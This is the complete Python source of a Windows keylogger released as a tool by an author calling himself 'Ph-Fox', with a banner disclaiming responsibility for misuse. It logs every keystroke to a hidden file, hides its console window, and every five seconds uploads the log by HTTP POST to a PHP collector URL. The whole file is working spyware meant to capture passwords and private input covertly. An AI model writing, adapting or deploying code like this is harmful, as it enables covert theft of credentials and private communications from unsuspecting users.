import requests, time, threading
from pynput import keyboard
import win32gui, win32con

def upload():
	while True:
		url = 'http://localhost/logz/logger.php'
		f = open('.logz.txt')
		logz = f.read()
		r = requests.post(url, data={'klogz':logz})
		f.close()
		time.sleep(5)

def save(key):
	f = open('.logz.txt','a')
	if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
		f.write('<Ctrl> ')
	elif key == keyboard.Key.esc:
		f.write('<Esc> ')
	elif key == keyboard.Key.space:
		f.write(' ')
	elif key == keyboard.Key.shift_r or key == keyboard.Key.shift_l:
		f.write('<Shift> ')
	elif key == keyboard.Key.backspace:
		f.write('<Backspace> ')
	elif key == keyboard.Key.enter:
		f.write('<Enter> ')
	elif key == keyboard.Key.tab:
		f.write('<Tab> ')
	elif key == keyboard.Key.caps_lock:
		f.write('<CapsLk> ')
	elif key == keyboard.Key.cmd:
		f.write('<Cmd/Win> ')
	elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_gr:
		f.write('<Alt> ')
	elif key == keyboard.Key.menu:
		f.write('<menu> ')
	elif key == keyboard.Key.left:
		f.write('<Left> ')
	elif key == keyboard.Key.right:
		f.write('<Right> ')
	elif key == keyboard.Key.down:
		f.write('<Down> ')
	elif key == keyboard.Key.up:
		f.write('<Up> ')
	elif key == keyboard.Key.insert:
		f.write('<Insert> ')
	elif key == keyboard.Key.delete:
		f.write('<Del> ')
	elif key == keyboard.Key.home:
		f.write('<Home> ')
	elif key == keyboard.Key.end:
		f.write('<End> ')
	elif key == keyboard.Key.page_down:
		f.write('<PageDown> ')
	elif key == keyboard.Key.page_up:
		f.write('<PageUp> ')
	elif key == keyboard.Key.print_screen:
		f.write('<PrintScreen> ')
	elif key == keyboard.Key.scroll_lock:
		f.write('<ScrlLk> ')
	elif key == keyboard.Key.pause:
		f.write('<Pause> ')
	elif key == keyboard.Key.num_lock:
		f.write('<NumLk> ')
	elif key == keyboard.Key.f1:
		f.write('<f1> ')
	elif key == keyboard.Key.f2:
		f.write('<f2> ')
	elif key == keyboard.Key.f3:
		f.write('<f3> ')
	elif key == keyboard.Key.f4:
		f.write('<f4> ')
	elif key == keyboard.Key.f5:
		f.write('<f5> ')
	elif key == keyboard.Key.f6:
		f.write('<f6> ')
	elif key == keyboard.Key.f7:
		f.write('<f7> ')
	elif key == keyboard.Key.f8:
		f.write('<f8> ')
	elif key == keyboard.Key.f9:
		f.write('<f9> ')
	elif key == keyboard.Key.f10:
		f.write('<f10> ')
	elif key == keyboard.Key.f11:
		f.write('<f11> ')
	elif key == keyboard.Key.f12:
		f.write('<f12> ')
	else:
		f.write(str(key).replace("'",""))
	f.close()

def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

def on_release(key):
    print('{0} released'.format(key))
    save(key)
    if key == keyboard.Key.esc:
    	pass
        #return False


print("""
╔――――――――――――――――――――――――――――――――――――――――――――――╗
╟  ╔═╗┬ ┬ ╔═╗┌─┐─┐ ┬  ╦╔═   ╦  ┌─┐┌─┐┌─┐┌─┐┬─┐ ╢
╟  ╠═╝├─┤ ╠╣ │ │┌┴┬┘  ╠╩╗───║  │ ││ ┬│ ┬├┤ ├┬┘ ╢
╟  ╩  ┴ ┴o╚  └─┘┴ └─  ╩ ╩   ╩═╝└─┘└─┘└─┘└─┘┴└─ ╢
╟  By: Ph-Fox                                  ╢
╟ Note:                                        ╢
╟   I am no longer responsible                 ╢
╟   for any misuse of this tool.               ╢
╚――――――――――――――――――――――――――――――――――――――――――――――╝
""")
print("Starting..")
time.sleep(5)
winz = win32gui.GetForegroundWindow()
win32gui.ShowWindow(winz, win32con.SW_HIDE)
threading.Thread(target=upload).start()

with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
	listener.join()

listener = keyboard.Listener(on_press=on_press,on_release=on_release)
listener.start()
